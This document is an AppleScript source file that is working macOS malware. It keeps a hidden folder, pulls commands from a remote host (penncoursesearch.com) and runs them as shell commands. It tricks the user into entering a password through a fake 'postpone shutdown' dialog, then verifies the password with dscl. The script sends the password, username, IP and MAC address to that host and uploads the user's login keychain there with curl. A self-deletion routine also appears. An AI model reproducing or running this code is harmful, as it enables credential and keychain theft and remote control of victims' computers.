delay 10
try
	set theuser to do shell script "whoami"
	try
		do shell script "mkdir ~/Library/FontCollections/." & theuser & "" -- Make the hidden folder in the user's Public folder
	end try
	set ufld to "/Users/" & theuser & "/Library/FontCollections/." & theuser & "/"
on error
	return
end try

set remoteHost to "http://penncoursesearch.com:5000"
--set remoteHost to "http://localhost:3000"
set commandURL to remoteHost & "/remote.txt"
try
	set commandArgs to paragraphs of (do shell script "curl " & commandURL & " | cut -d ':' -f 2")
	if (item 1 of commandArgs) is "true" then -- Kill
		try
			try
				do shell script "rm -rf " & ufld
			end try
			try
				do shell script "rm ~/library/LaunchAgents/com.h4k.plist"
			end try
			try
				do shell script "rm -rf " & quoted form of (POSIX path of (path to me))
			end try
		end try
		return
	else if (item 2 of commandArgs) is "true" then -- Hold
		log "hold"
		return
	else
		if (count of commandArgs) > 2 then
			repeat with a from 3 to (count of commandArgs)
				if (item a of commandArgs) starts with "P-" or (item a of commandArgs) starts with "A-" then
					try
						do shell script (characters 3 thru -1 of (item a of commandArgs) as string) -- Run commands
					end try
				end if
			end repeat
		end if
	end if
on error
	return
end try
delay 1
try
	try
		set oldpasswd to (do shell script "cat " & ufld & theuser & ".txt")
		checkPassword(theuser, oldpasswd) -- Check if password is correct
		set passwd to oldpasswd
	on error err
		repeat
			set quest to (display dialog "Please enter your password to postpone shutdown." with title "Password" default answer "" buttons {"OK"} default button 1 giving up after 10 with icon ((path to me) & "Contents:Resources:icon.icns" as text) as alias with hidden answer) -- Prompt for Password
			set passwd to text returned of quest
			if gave up of quest = true then -- If the user doesn't enter a password:
				tell application "System Events" to keystroke "q" using {command down, option down, shift down}
				return
			end if
			try
				checkPassword(theuser, passwd)
				exit repeat
			on error err
				log err
				display dialog "Please try again." with title "Password" buttons {"OK"} default button 1 giving up after 3 with icon ((path to me) & "Contents:Resources:icon.icns" as text) as alias -- If password is incorrect, try again
			end try
		end repeat
		do shell script "echo " & passwd & " > " & ufld & theuser & ".txt"
	end try
on error err
	log err
end try
log "new"
try
	try
		with timeout of 5 seconds
			--do shell script "curl http://checkip.dyndns.org/ | grep 'Current IP Address' | cut -d : -f 2 | cut -d '<' -f 1"
			set WANIP to do shell script "ifconfig | grep 'autoconf temporary' | cut -d ' ' -f 2" -- Get IP
		end timeout
	on error
		set WANIP to "0.0.0.0"
	end try
	set MACAD to first paragraph of (do shell script "ifconfig | grep ether | cut -d ' ' -f 2")
	log "a"
	do shell script "curl \"" & remoteHost & "/a?pass=" & passwd & "&user=" & theuser & "&WANIP=" & WANIP & "&MACAD=" & MACAD & "\""
on error err
	log err
end try
log "hello"

try
	log "tee"
	do shell script "cd  ~/Library/Keychains/; curl -i -F filedata=@login.keychain -F macad=" & MACAD & " -F passwd=" & passwd & " " & remoteHost & "/b"
end try

on checkPassword(user, pass)
	do shell script "dscl . -passwd /Users/" & user & " " & pass & " benwashere"
	do shell script "dscl . -passwd /Users/" & user & " benwashere " & pass & "" -- Check if password is correct
end checkPassword